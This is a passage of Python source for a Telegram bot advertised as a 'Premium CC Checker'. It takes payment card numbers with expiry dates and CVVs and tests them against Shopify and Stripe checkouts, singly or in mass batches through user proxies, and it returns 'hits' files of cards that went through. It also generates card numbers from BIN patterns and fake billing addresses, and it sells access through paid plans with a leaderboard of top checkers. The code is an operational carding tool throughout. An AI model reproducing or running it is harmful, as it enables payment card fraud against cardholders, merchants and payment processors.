        f"<b>{sc('Mass Complete' if not cancelled else 'Mass Cancelled')}</b>\n"
        f"<blockquote>{pe('shop')} {sc('Mode')}: <b>{mode.upper()}</b>\n"
        f"{pe('num1')} {sc('Total')}: <b>{total}</b>\n"
        f"{pe('check')} {sc('Hits')}: <b>{hits_count}</b>\n"
        f"{pe('cross2')} {sc('Declined')}: <b>{counts['declined']}</b>\n"
        f"{pe('warn')} {sc('Errors')}: <b>{counts['error'] + counts['timeout'] + counts['proxy_error'] + counts['site_error']}</b>\n"
        f"{pe('hourglass')} {sc('Time')}: <b>{elapsed:.1f}s</b></blockquote>"
    )
    try:
        await progress_msg.edit_text(final, parse_mode="HTML", reply_markup=None)
    except:
        try: await msg.answer(final, parse_mode="HTML")
        except: pass

    # Send hits file
    if hits_count > 0:
        lines = [
            f"# HITS · mode={mode} · uid={uid}",
            f"# {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC",
            ""
        ]
        for cc, (status, resp) in results.items():
            if status in ("CHARGED", "APPROVED", "APPROVED_NSF",
                          "APPROVED_CCN", "APPROVED_3DS"):
                lines.append(f"{cc} | {status} | {resp}")
        data = "\n".join(lines).encode("utf-8")
        try:
            await msg.answer_document(
                BufferedInputFile(data, filename=f"hits_{mode}_{uid}_{int(start_time)}.txt"),
                caption=f"{pe('gem')} <b>{hits_count} {sc('hits')}</b>",
                parse_mode="HTML")
        except: pass
        # ── Router setup ───────────────────────────────────────────────────────────
router = Router()

# ── Welcome / plans texts ──────────────────────────────────────────────────
def welcome_text(user_row, first_name):
    bot_name = get_setting("bot_name", "NOVAL AUTO SHOPIFY")
    return (
        f"{pe('up')} <b>[=] Bot » {sc(bot_name)} » {pe('up')}</b>\n"
        f"{pe('gem')} <b>[=] Type » Premium CC Checker » {pe('gem')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('up')} <b>[=] Shopify Checker » /sh » /msh » {pe('up')}</b>\n"
        f"{pe('gem')} <b>[=] Stripe Auth » /auth » /masssa » {pe('gem')}</b>\n"
        f"{pe('link')} <b>[=] Proxy » HTTP · SOCKS4 · SOCKS5 » {pe('link')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('diamond')} <b>[=] Menu » Select option below » {pe('diamond')}</b>"
    )

def parse_site_list(raw: str):
    parsed, seen = [], set()
    for l in re.split(r"[\r\n,;]+", raw or ""):
        s = l.strip().lower()
        if not s or s.startswith("#"): continue
        s = s[8:] if s.startswith("https://") else s[7:] if s.startswith("http://") else s
        s = s.split("/")[0]
        if s and s not in seen:
            seen.add(s); parsed.append(s)
    return parsed

# ── /start ────────────────────────────────────────────────────────────────
@router.message(CommandStart())
async def cmd_start(msg: Message, command: CommandObject):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid):
        return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>",
                                parse_mode="HTML")

    # Referral handling — rewards OUTSIDE the db context
    if command and command.args and command.args.startswith("ref_"):
        try:
            referrer_id = int(command.args.split("_")[1])
            user = get_user(uid)
            if user and referrer_id != uid and user["referred_by"] == 0:
                ensure_user(referrer_id)
                reward_plan = None
                with db() as c:
                    c.execute("UPDATE users SET referred_by=? WHERE uid=?",
                              (referrer_id, uid))
                    c.execute("UPDATE users SET refer_count=refer_count+1 WHERE uid=?",
                              (referrer_id,))
                    r = c.execute("SELECT refer_count FROM users WHERE uid=?",
                                  (referrer_id,)).fetchone()
                    cnt = r["refer_count"] if r else 0
                    if cnt == 5:
                        c.execute("UPDATE users SET credits=credits+100 WHERE uid=?",
                                  (referrer_id,))
                    elif cnt == 20: reward_plan = ("premium", 30)
                    elif cnt == 50: reward_plan = ("max", 30)
                    elif cnt == 100: reward_plan = ("unlimited", 30)
                if reward_plan:
                    upgrade_user(referrer_id, reward_plan[0], reward_plan[1])
        except: pass

    # Force-sub check
    if not await check_force_sub(msg.bot, uid):
        kb_rows = [
            [pbtn(f"{sc('Join')} {ch['title'][:25] or sc('Channel')}",
                  icon="chat", color="primary",
                  url=ch["invite_link"] or f"https://t.me/{ch['chat_id'].lstrip('@')}")]
            for ch in force_channels_list(enabled_only=True)
        ]
        kb_rows.append([pbtn(sc("Verify Joined"), icon="check",
                             color="success", callback_data="verify_sub")])
        text = (
            f"{pe('unlock')} <b>[=] Access Restricted » 🛡</b>\n"
            f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
            f"{pe('star')} <b>[=] Info » You must join our channel {pe('star')}</b>\n"
            f"{pe('link')} <b>[=] Step » Tap Join then Verify {pe('link')}</b>"
        )
        return await msg.answer(text, parse_mode="HTML",
                                reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))

    streak = apply_streak(uid)
    user = get_user_or_create(uid, msg.from_user.username or "")
    caption = welcome_text(user, msg.from_user.first_name)
    if streak["reward"]:
        caption += f"\n\n{pe('star')} <b>{sc('Streak Reward')}!</b> {streak['reward']}"
    media = get_setting("asset_VID_MAIN") or random.choice(VIDEOS)
    try:
        await msg.answer_video(video=media, caption=caption,
                               reply_markup=main_menu_kb(uid))
    except:
        await msg.answer(caption, reply_markup=main_menu_kb(uid))

# ── /id ───────────────────────────────────────────────────────────────────
@router.message(Command("id"))
async def cmd_id(msg: Message):
    await msg.answer(
        f"{pe('link')} <b>{sc('Chat Info')}</b>\n"
        f"<blockquote>{pe('chat')} {sc('Title')}: <b>{esc(getattr(msg.chat, 'title', None) or msg.chat.type)}</b>\n"
        f"{pe('diamond')} {sc('Type')}: <b>{msg.chat.type}</b>\n"
        f"{pe('num1')} {sc('Chat ID')}: <code>{msg.chat.id}</code>\n"
        f"{pe('user')} {sc('Your ID')}: <code>{msg.from_user.id}</code></blockquote>",
        parse_mode="HTML")

# ── /panel ────────────────────────────────────────────────────────────────
@router.message(Command("panel", "admin"))
async def cmd_panel(msg: Message):
    if not is_admin(msg.from_user.id): return
    await msg.answer_photo(photo=IMG_MAIN,
                           caption=f"{pe('settings')} <b>{sc('Admin Panel')}</b>",
                           parse_mode="HTML",
                           reply_markup=admin_main_kb(msg.from_user.id))

# ── /sh — Shopify single ──────────────────────────────────────────────────
@router.message(Command("sh", "check"))
async def cmd_check(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid):
        return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>",
                                parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(
            f"{pe('docs')} <b>{sc('Usage')}</b>\n"
            f"<blockquote><code>/sh CC|MM|YY|CVV</code>\n"
            f"{sc('or paste multiple CCs one per line')}</blockquote>",
            parse_mode="HTML")

    raw = args[1]
    normalized, seen = [], set()
    for line in raw.splitlines():
        for tok in re.split(r"[\s,;]+", line.strip()):
            n = normalize_cc(tok)
            if n and n not in seen:
                seen.add(n); normalized.append(n)

    if not normalized:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>",
                                parse_mode="HTML")
    if len(normalized) == 1:
        await process_check_logic(msg, normalized[0], msg.bot, mode="shopify")
        return

    # Mass flow — confirm
    _cleanup_pending_mass()
    plan_key = plan_of(uid)
    plan_cfg = PLANS.get(plan_key, PLANS["free"])
    mass_cap = plan_cfg["mass_limit"]
    if not is_admin(uid) and len(normalized) > mass_cap:
        return await msg.answer(
            f"{pe('warn')} <b>{sc('Mass limit exceeded')}</b>\n"
            f"<blockquote>{pe('chart')} {sc('Plan')}: <b>{plan_cfg['name']}</b>\n"
            f"{pe('num1')} {sc('Max')}: <b>{mass_cap}</b>\n"
            f"{pe('diamond')} {sc('Sent')}: <b>{len(normalized)}</b></blockquote>",
            parse_mode="HTML")
    token = uuid.uuid4().hex[:12]
    _pending_mass[token] = {
        "uid": uid, "ccs": normalized, "mode": "shopify",
        "chat_id": msg.chat.id, "msg_id": msg.message_id,
        "ts": time.time(),
    }
    sample = "\n".join(f"<code>{esc(c)}</code>" for c in normalized[:5])
    more = f"\n<i>... +{len(normalized)-5} more</i>" if len(normalized) > 5 else ""
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(f"{sc('Start')} ({len(normalized)})", icon="check", color="success",
             callback_data=f"mass_start:{token}"),
        pbtn(sc("Cancel"), icon="cross1", color="danger",
             callback_data=f"mass_cancel:{token}"),
    ]])
    await msg.answer(
        f"{pe('gem')} <b>{sc('Shopify Mass — Confirm')}</b>\n"
        f"<blockquote>{pe('num1')} {sc('Total')}: <b>{len(normalized)}</b>\n"
        f"{pe('shop')} {sc('Mode')}: <b>SHOPIFY</b>\n"
        f"{pe('user')} {sc('Plan')}: <b>{plan_cfg['name']}</b></blockquote>\n"
        f"<blockquote>{sample}{more}</blockquote>",
        parse_mode="HTML", reply_markup=kb)

# ── /auth — Stripe single ─────────────────────────────────────────────────
@router.message(Command("auth"))
async def cmd_auth(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid):
        return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>",
                                parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(
            f"{pe('docs')} <b>{sc('Usage')}</b> <code>/auth CC|MM|YY|CVV</code>",
            parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>",
                                parse_mode="HTML")
    await process_check_logic(msg, cc, msg.bot, mode="stripe")

# ── /msh — Shopify mass ───────────────────────────────────────────────────
@router.message(Command("msh"))
async def cmd_mass_shopify(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    user = get_user(uid)
    if not user or user["banned"]:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>",
                                parse_mode="HTML")
    cards = []
    args = msg.text.split(maxsplit=1)
    if len(args) > 1:
        cards.extend(re.split(r"[\s,;]+", args[1]))
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text:
            cards.extend(re.split(r"[\s,;]+", replied.text))
        elif replied.document:
            doc = replied.document
            fname = (doc.file_name or "").lower()
            if not fname.endswith(".txt") or (doc.file_size or 0) > 2 * 1024 * 1024:
                return await msg.answer(f"{pe('cross1')} <b>{sc('Only .txt <2MB')}</b>",
                                        parse_mode="HTML")
            st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')}...</b>",
                                  parse_mode="HTML")
            try:
                raw = (await msg.bot.download_file(
                    (await msg.bot.get_file(doc.file_id)).file_path)).read().decode("utf-8", errors="ignore")
                cards.extend(re.split(r"[\s,;]+", raw))
            except Exception as e:
                return await st.edit_text(
                    f"{pe('cross1')} <b>{sc('Failed')}:</b> {esc(_sanitize_err(str(e)))}",
                    parse_mode="HTML")
            try: await st.delete()
            except: pass
    if not cards:
        return await msg.answer(
            f"{pe('docs')} <b>{sc('Usage')}</b>\n"
            f"<blockquote>{pe('pen')} <code>/msh cc|mm|yy|cvv</code>\n"
            f"{pe('docs')} {sc('or reply to .txt file')}</blockquote>",
            parse_mode="HTML")
    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c)
        if n and n not in seen:
            seen.add(n); normalized.append(n)
    if not normalized:
        return await msg.answer(f"{pe('docs')} <b>{sc('No valid cards')}</b>",
                                parse_mode="HTML")
    if not is_admin(uid):
        pk = plan_of(uid)
        limit = PLANS.get(pk, PLANS["free"]).get("mass_limit", 100)
        if len(normalized) > limit:
            return await msg.answer(
                f"{pe('stop')} <b>{sc('Batch Limit Exceeded')}</b>\n"
                f"<blockquote>{pe('gem')} {PLANS[pk]['name']}\n"
                f"{pe('shop')} {sc('Max')}: <b>{limit}</b>\n"
                f"{pe('warn')} {sc('Sent')}: <b>{len(normalized)}</b></blockquote>",
                parse_mode="HTML")
    await msg.answer(
        f"{pe('check')} <b>{sc('Shopify Mass Start')}</b>\n"
        f"<blockquote>{pe('gem')} {sc('Cards')}: <b>{len(normalized)}</b></blockquote>",
        parse_mode="HTML")
    await run_mass_check(msg, normalized, msg.bot, bypass_quota=is_admin(uid),
                         uid=uid, username=msg.from_user.username or "",
                         mode="shopify")

# ── /masssa — Stripe mass auth (renamed) ──────────────────────────────────
@router.message(Command("masssa"))
async def cmd_mass_stripe_auth(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    user = get_user(uid)
    if not user or user["banned"]:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>",
                                parse_mode="HTML")
    cards = []
    args = msg.text.split(maxsplit=1)
    if len(args) > 1:
        cards.extend(re.split(r"[\s,;]+", args[1]))
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text:
            cards.extend(re.split(r"[\s,;]+", replied.text))
        elif replied.document:
            doc = replied.document
            fname = (doc.file_name or "").lower()
            if not fname.endswith(".txt") or (doc.file_size or 0) > 2 * 1024 * 1024:
                return await msg.answer(f"{pe('cross1')} <b>{sc('Only .txt <2MB')}</b>",
                                        parse_mode="HTML")
            st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')}...</b>",
                                  parse_mode="HTML")
            try:
                raw = (await msg.bot.download_file(
                    (await msg.bot.get_file(doc.file_id)).file_path)).read().decode("utf-8", errors="ignore")
                cards.extend(re.split(r"[\s,;]+", raw))
            except Exception as e:
                return await st.edit_text(
                    f"{pe('cross1')} <b>{sc('Failed')}:</b> {esc(_sanitize_err(str(e)))}",
                    parse_mode="HTML")
            try: await st.delete()
            except: pass
    if not cards:
        return await msg.answer(
            f"{pe('docs')} <b>{sc('Usage')}</b>\n"
            f"<blockquote>{pe('pen')} <code>/masssa cc|mm|yy|cvv</code>\n"
            f"{pe('docs')} {sc('or reply to .txt file')}</blockquote>",
            parse_mode="HTML")
    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c)
        if n and n not in seen:
            seen.add(n); normalized.append(n)
    if not normalized:
        return await msg.answer(f"{pe('docs')} <b>{sc('No valid cards')}</b>",
                                parse_mode="HTML")
    proxies = user_proxy_list(uid)
    if not proxies and not is_admin(uid):
        return await msg.answer(
            f"{pe('warn')} <b>{sc('Proxy Required for Stripe Auth')}</b>\n"
            f"<blockquote>{pe('link')} {sc('Add via /proxy')}</blockquote>",
            parse_mode="HTML")
    if not is_admin(uid):
        pk = plan_of(uid)
        limit = PLANS.get(pk, PLANS["free"]).get("mass_limit", 100)
        if len(normalized) > limit:
            return await msg.answer(
                f"{pe('stop')} <b>{sc('Batch Limit Exceeded')}</b>\n"
                f"<blockquote>{pe('gem')} {PLANS[pk]['name']}\n"
                f"{pe('shop')} {sc('Max')}: <b>{limit}</b>\n"
                f"{pe('warn')} {sc('Sent')}: <b>{len(normalized)}</b></blockquote>",
                parse_mode="HTML")
    await msg.answer(
        f"{pe('check')} <b>{sc('Stripe Mass Auth Start')}</b>\n"
        f"<blockquote>{pe('gem')} {sc('Cards')}: <b>{len(normalized)}</b>\n"
        f"{pe('link')} {sc('Proxies')}: <b>{len(proxies)}</b></blockquote>",
        parse_mode="HTML")
    await run_mass_check(msg, normalized, msg.bot, bypass_quota=is_admin(uid),
                         uid=uid, username=msg.from_user.username or "",
                         mode="stripe")

# ── /gen ──────────────────────────────────────────────────────────────────
@router.message(Command("gen"))
async def cmd_gen(msg: Message):
    args = msg.text.split(maxsplit=2)
    if len(args) < 2:
        return await msg.answer(
            f"{pe('gem')} <b>{sc('CC Generator')}</b>\n"
            f"<blockquote>{pe('docs')} <b>Usage:</b> <code>/gen pattern [count]</code>\n"
            f"{pe('pen')} <b>Example:</b> <code>/gen 442314xxxxxxxxxx|12|25|xxx 10</code></blockquote>",
            parse_mode="HTML")
    pattern = args[1]
    amount = int(args[2]) if len(args) > 2 and args[2].isdigit() else 10
    max_limit = int(get_setting("gen_limit", "10"))
    if not is_admin(msg.from_user.id) and amount > max_limit:
        return await msg.answer(f"{pe('stop')} <b>Max limit is {max_limit}.</b>",
                                parse_mode="HTML")
    cards = generate_custom_cc(pattern, amount)
    if not cards:
        return await msg.answer(f"{pe('cross1')} <b>Invalid pattern.</b>",
                                parse_mode="HTML")
    text = (f"{pe('check')} <b>Generated {len(cards)} Cards</b>\n"
            f"<blockquote><code>{chr(10).join(cards)}</code></blockquote>")
    await msg.answer(text, parse_mode="HTML")

# ── /format ───────────────────────────────────────────────────────────────
@router.message(Command("format"))
async def cmd_format(msg: Message):
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(
            f"{pe('docs')} <b>Usage:</b> <code>/format 4111111111111111|12|25|123</code>",
            parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc:
        return await msg.answer(f"{pe('cross1')} <b>Invalid card format.</b>",
                                parse_mode="HTML")
    await msg.answer(f"{pe('check')} <b>Formatted:</b>\n"
                     f"<blockquote><code>{cc}</code></blockquote>",
                     parse_mode="HTML")

# ── /bin ──────────────────────────────────────────────────────────────────
@router.message(Command("bin"))
async def cmd_bin_lookup(msg: Message):
    args = msg.text.split()
    if len(args) < 2 or not args[1].isdigit() or len(args[1]) < 6:
        return await msg.answer(
            f"{pe('diamond')} <b>{sc('BIN Lookup')}</b>\n"
            f"<blockquote>{pe('docs')} {sc('Usage')}: <code>/bin 401234</code></blockquote>",
            parse_mode="HTML")
    st = await msg.answer(f"{pe('loading')} <b>{sc('Searching BIN')}...</b>",
                          parse_mode="HTML")
    info = await lookup_bin(args[1][:6])
    if "error" in info:
        return await st.edit_text(
            f"{pe('cross1')} <b>{sc('BIN not found')}</b>", parse_mode="HTML")
    bank = info.get("Issuer", "N/A")
    cd = info.get("Country", {}) or {}
    country = cd.get("Name", "N/A")
    flag = country_flag(cd.get("Code", ""))
    ctype = (info.get("Type") or "N/A").upper()
    brand = (info.get("Scheme") or "N/A").upper()
    level = (info.get("CardTier") or info.get("Level") or "N/A").upper()
    text = (
        f"{pe('diamond')} <b>{sc('BIN Information')}</b>\n"
        f"<blockquote>"
        f"{pe('num1')} <b>{sc('BIN')}</b> · <code>{args[1][:6]}</code>\n"
        f"{pe('shop')} <b>{sc('Bank')}</b> · {esc(bank)}\n"
        f"{flag} <b>{sc('Country')}</b> · {esc(country)}\n"
        f"{pe('star')} <b>{sc('Type')}</b> · {esc(ctype)}\n"
        f"{pe('gem4')} <b>{sc('Brand')}</b> · {esc(brand)}\n"
        f"{pe('glow_star')} <b>{sc('Level')}</b> · {esc(level)}\n"
        f"{HIDDEN_CREDIT}</blockquote>"
    )
    await st.edit_text(text, parse_mode="HTML")

# ── /addr ─────────────────────────────────────────────────────────────────
@router.message(Command("addr"))
async def cmd_addr(msg: Message):
    countries = [
        ("US","New York","NY","10001"),("US","Los Angeles","CA","90001"),
        ("UK","London","LDN","EC1A"),("CA","Toronto","ON","M5V"),
        ("AU","Sydney","NSW","2000"),("DE","Berlin","BE","10115"),
        ("FR","Paris","IDF","75001"),("JP","Tokyo","TK","100-0001"),
        ("BR","Sao Paulo","SP","01000"),("IN","Mumbai","MH","400001"),
        ("ZA","Cape Town","WC","8001"),("NG","Lagos","LA","100001"),
        ("MX","Mexico City","CMX","01000"),("ES","Madrid","MD","28001"),
        ("IT","Rome","RM","00100"),("RU","Moscow","MOW","101000"),
        ("TR","Istanbul","IST","34000"),("AE","Dubai","DXB","00000"),
        ("SG","Singapore","SG","018956"),("HK","Hong Kong","HK","999077"),
    ]
    streets = ["Main St","Park Ave","Oak Dr","Pine Ln","Cedar Rd",
               "Maple Ct","High St","Station Rd","Church Ln","Victoria Rd"]
    country, city, state, zip_code = random.choice(countries)
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    text = (
        f"{pe('user')} <b>Generated Address ({country})</b>\n"
        f"<blockquote>〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('link')} <b>Street:</b> <code>{street}</code>\n"
        f"{pe('shop')} <b>City:</b> <code>{city}</code>\n"
        f"{pe('diamond')} <b>State:</b> <code>{state}</code>\n"
        f"{pe('num1')} <b>ZIP:</b> <code>{zip_code}</code>\n"
        f"{pe('star')} <b>Country:</b> <code>{country}</code>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️</blockquote>"
    )
    await msg.answer(text, parse_mode="HTML")

# ── /chk ──────────────────────────────────────────────────────────────────
@router.message(Command("chk"))
async def cmd_chk(msg: Message):
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer("Usage: <code>/chk host:port:user:pass</code>",
                                parse_mode="HTML")
    proxy = normalize_proxy(args[1].strip())
    if not proxy:
        return await msg.answer("❌ Invalid proxy format.", parse_mode="HTML")
    st = await msg.answer("⏳ Testing Proxy...", parse_mode="HTML")
    res = await check_proxy_hq(proxy)
    if res.get("ok"):
        await st.edit_text(f"✅ <b>Proxy is LIVE</b>\n"
                           f"<blockquote>Latency: <b>{res.get('latency')}s</b></blockquote>",
                           parse_mode="HTML")
    else:
        await st.edit_text(f"❌ <b>Proxy is DEAD</b>\n"
                           f"<blockquote>Error: {esc(res.get('error', 'Unknown'))}</blockquote>",
                           parse_mode="HTML")

# ── /stats ────────────────────────────────────────────────────────────────
@router.message(Command("stats"))
async def cmd_stats(msg: Message):
    if not is_admin(msg.from_user.id):
        return await msg.answer(f"{pe('cross1')} <b>Admin only.</b>", parse_mode="HTML")
    import platform
    uptime = int(time.time() - START_TIME)
    cpu, ram = 0, 0
    try:
        import psutil
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
    except: pass
    text = (f"📝 <b>[=] System Health</b>\n"
            f"<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
            f"💻 <b>CPU:</b> {cpu}%\n"
            f"🧠 <b>RAM:</b> {ram}%\n"
            f"⏱ <b>Uptime:</b> {uptime // 3600}h {(uptime % 3600) // 60}m\n"
            f"🌐 <b>OS:</b> {platform.system()}\n"
            f"━━━━━━━━━━━━━━━━━━━━</blockquote>")
    await msg.answer(text, parse_mode="HTML")

# ── /redeem ───────────────────────────────────────────────────────────────
async def redeem_code(msg: Message, code: str) -> None:
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    code = code.strip().upper()
    with db() as c:
        row = c.execute("SELECT * FROM redeem_codes WHERE code=?", (code,)).fetchone()
        if not row:
            return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid code')}</b>",
                                    parse_mode="HTML")
        if row["used"] >= row["max_uses"]:
            return await msg.answer(f"{pe('cross1')} <b>{sc('Code fully used')}</b>",
                                    parse_mode="HTML")
        if c.execute("SELECT 1 FROM redeem_log WHERE code=? AND uid=?",
                     (code, uid)).fetchone():
            return await msg.answer(f"{pe('cross1')} <b>{sc('Already redeemed')}</b>",
                                    parse_mode="HTML")
        c.execute("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
        c.execute("INSERT INTO redeem_log(code, uid, used_at) VALUES (?,?,?)",
                  (code, uid, datetime.now(timezone.utc).isoformat()))
    upgrade_user(uid, row["plan"], row["days"])
    await msg.answer(
        f"{pe('check')} <b>{sc('Code Redeemed')}</b>\n"
        f"<blockquote>{pe('gem')} {sc('Plan')}: <b>{PLANS[row['plan']]['name']}</b>\n"
        f"{pe('hourglass')} {sc('Days')}: <b>{row['days']}</b>\n"
        f"{HIDDEN_CREDIT}</blockquote>", parse_mode="HTML")

@router.message(Command("redeem"))
async def cmd_redeem(msg: Message):
    if get_setting("maintenance") == "1" and not is_admin(msg.from_user.id):
        return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(f"{pe('gem2')} <b>{sc('Redeem Code')}</b>\n"
                                f"<blockquote>{pe('docs')} {sc('Usage')}: <code>/redeem CODE</code></blockquote>",
                                parse_mode="HTML")
    await redeem_code(msg, args[1])

# ── /top ──────────────────────────────────────────────────────────────────
@router.message(Command("top"))
async def cmd_top(msg: Message):
    with db() as c:
        rows = c.execute("SELECT uid, username, total_hits FROM users "
                         "WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    text = "🏆 <b>Top 10 Checkers</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
    for i, r in enumerate(rows, 1):
        text += f"{i}. <code>{r['uid']}</code> ({esc(r['username'] or 'N/A')}) ~ <b>{r['total_hits']} hits</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━</blockquote>"
    await msg.answer(text, parse_mode="HTML")

# ── /cmd ──────────────────────────────────────────────────────────────────
@router.message(Command("cmd", "commands", "help"))
async def cmd_commands(msg: Message):
    uid = msg.from_user.id
    user_cmds = (
        f"{pe('diamond')} <b>{sc('All Commands')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<blockquote>"
        f"{pe('shop')} <b>/sh</b> <code>CC|MM|YY|CVV</code> — {sc('Shopify Single')}\n"
        f"{pe('refresh')} <b>/msh</b> — {sc('Shopify Mass')}\n"
        f"{pe('gem')} <b>/auth</b> <code>CC|MM|YY|CVV</code> — {sc('Stripe Auth Single')}\n"
        f"{pe('gem2')} <b>/masssa</b> — {sc('Stripe Auth Mass')}\n"
        f"{pe('diamond')} <b>/bin</b> <code>401234</code> — {sc('BIN Lookup')}\n"
        f"{pe('star')} <b>/gen</b> <code>pattern [count]</code> — {sc('CC Generator')}\n"
        f"{pe('pen')} <b>/format</b> <code>CC|MM|YY|CVV</code> — {sc('CC Formatter')}\n"
        f"{pe('user')} <b>/addr</b> — {sc('Address Generator')}\n"
        f"{pe('link')} <b>/chk</b> <code>proxy</code> — {sc('Proxy Checker')}\n"
        f"{pe('gem3')} <b>/redeem</b> <code>KEY</code> — {sc('Redeem Key')}\n"
        f"{pe('chat')} <b>/fb</b> <code>message</code> — {sc('Send Feedback')}\n"
        f"{pe('chat2')} <b>/iadmin</b> <code>message</code> — {sc('Message Admin')}\n"
        f"{pe('chart')} <b>/top</b> — {sc('Top Checkers')}\n"
        f"{pe('star')} <b>/start</b> — {sc('Main Menu')}\n"
        f"{pe('docs')} <b>/cmd</b> — {sc('This list')}"
        f"</blockquote>"
    )
    if is_admin(uid):
        user_cmds += (
            f"\n{pe('settings')} <b>{sc('Admin Commands')}</b>\n"
            f"<blockquote>"
            f"{pe('settings')} <b>/panel</b> — {sc('Admin Panel')}\n"
            f"{pe('docs')} <b>/stats</b> — {sc('System Stats')}\n"
            f"{pe('refresh')} <b>/restore_done</b> — {sc('Force DB Restore')}\n"
            f"{pe('trash')} <b>/restore_clear</b> — {sc('Clear Restore')}"
            f"</blockquote>"
        )
    await msg.answer(user_cmds, parse_mode="HTML")

# ── FEEDBACK — submission with admin approval ─────────────────────────────
async def submit_feedback_for_approval(bot, fid: int, uid: int, username: str,
                                       text: str, file_id: str = "",
                                       file_type: str = "none"):
    preview = (text or "[media]")[:800]
    caption = (
        f"{pe('chat')} <b>{sc('New Feedback')} #{fid}</b>\n"
        f"<blockquote>{pe('user')} @{esc(username or str(uid))} · <code>{uid}</code></blockquote>\n"
        f"<blockquote>{esc(preview)}</blockquote>\n"
        f"{pe('warn')} <i>{sc('Approve to publish to logs & feedback channels')}</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(sc("Approve"), icon="check", color="success",
              callback_data=f"fb_approve:{fid}"),
        pbtn(sc("Reject"), icon="cross1", color="danger",
              callback_data=f"fb_reject:{fid}"),
    ]])
    for admin_id in ADMIN_IDS:
        try:
            if file_type == "photo" and file_id:
                await bot.send_photo(admin_id, file_id, caption=caption,
                                     parse_mode="HTML", reply_markup=kb)
            elif file_type == "document" and file_id:
                await bot.send_document(admin_id, file_id, caption=caption,
                                        parse_mode="HTML", reply_markup=kb)
            elif file_type == "video" and file_id:
                await bot.send_video(admin_id, file_id, caption=caption,
                                     parse_mode="HTML", reply_markup=kb)
            else:
                await bot.send_message(admin_id, caption, parse_mode="HTML",
                                       reply_markup=kb)
        except Exception as e:
            log.debug(f"fb→admin {admin_id}: {e}")

async def _send_feedback_to_channels(bot, fid: int, uid: int, username: str,
                                     text: str, file_id: str = "",
                                     file_type: str = "none"):
    channels = []
    for key in ("hit_log_channel", "auto_post_chat",
                "fb_channel_id", "fb_channel_id2"):
        ch = get_setting(key)
        if ch and ch not in channels:
            channels.append(ch)
    for ch in channels:
        try:
            chat_id = int(ch) if str(ch).lstrip("-").isdigit() else ch
            caption = (
                f"{pe('chat')} <b>{sc('Feedback')} #{fid}</b>\n"
                f"<blockquote>{pe('user')} @{esc(username or str(uid))} · <code>{uid}</code></blockquote>\n"
                f"<blockquote>{esc(text[:800]) if text else '[media]'}</blockquote>"
            )
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                pbtn(sc("Reply"), icon="chat", color="success",
                      callback_data=f"fb_reply:{fid}:{uid}")
            ]])
            if file_type == "photo" and file_id:
                await bot.send_photo(chat_id, file_id, caption=caption,
                                     parse_mode="HTML", reply_markup=kb)
            elif file_type == "document" and file_id:
                await bot.send_document(chat_id, file_id, caption=caption,
                                        parse_mode="HTML", reply_markup=kb)
            elif file_type == "video" and file_id:
                await bot.send_video(chat_id, file_id, caption=caption,
                                     parse_mode="HTML", reply_markup=kb)
            else:
                await bot.send_message(chat_id, caption, parse_mode="HTML",
                                       reply_markup=kb)
        except Exception as e:
            log.debug(f"fb relay to {ch}: {e}")

@router.message(Command("fb", "feedback"))
async def cmd_feedback(msg: Message):
    uid = msg.from_user.id
    username = msg.from_user.username or ""
    file_id, file_type, text = "", "none", ""
    source = msg.reply_to_message if msg.reply_to_message else msg
    if source.photo:
        file_id = source.photo[-1].file_id; file_type = "photo"; text = source.caption or ""
    elif source.document:
